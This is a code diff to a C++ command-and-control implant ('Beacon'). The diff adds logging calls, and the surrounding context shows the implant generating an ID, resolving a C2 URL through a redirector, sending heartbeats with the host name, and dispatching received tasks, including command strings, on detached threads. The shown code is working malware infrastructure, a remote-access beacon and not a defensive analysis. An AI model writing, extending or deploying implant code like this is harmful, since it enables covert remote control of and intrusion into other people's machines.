@@ -11,6 +11,7 @@
 #include <thread>
 #include <vector>
 #include <algorithm>
+#include "../utils/Logger.h"
 #ifndef NOMINMAX
 #define NOMINMAX
 #endif
@@ -79,6 +80,7 @@ namespace beacon {
 
 Beacon::Beacon() : c2FetchBackoff_(core::C2_FETCH_BACKOFF), taskDispatcher_(pendingResults_) {
     implantId_ = core::generateImplantId();
+    LOG_INFO("Implant initialized with ID: " + implantId_);
 }
 
 void Beacon::sleepWithJitter() {
@@ -97,7 +99,9 @@ void Beacon::run() {
     while (true) {
         if (c2Url_.empty()) {
             try {
+                LOG_DEBUG("Attempting to resolve C2 URL from: " + std::string(core::REDIRECTOR_URL));
                 c2Url_ = resolver.resolve();
+                LOG_INFO("C2 URL resolved: " + c2Url_);
                 c2FetchBackoff_ = core::C2_FETCH_BACKOFF; // Reset backoff on success
             } catch (const std::exception&) {
                 std::this_thread::sleep_for(std::chrono::duration<double>(c2FetchBackoff_));
@@ -117,6 +121,7 @@ void Beacon::run() {
                 {"host", getHostname()},
                 {"results", nlohmann::json::array()}
             };
+            LOG_DEBUG("Sending beacon heart-beat...");
 
             // Move pending results to in-flight
             Result result;
@@ -197,6 +202,7 @@ void Beacon::run() {
                         task.type = stringToTaskType(task_json["type"]);
                         task.cmd = task_json.value("cmd", "");
 
+                        LOG_INFO("Received task: " + task.task_id + " (" + task_json["type"].get<std::string>() + ")");
                         std::thread(&TaskDispatcher::dispatch, &taskDispatcher_, task).detach();
                     }
                 }
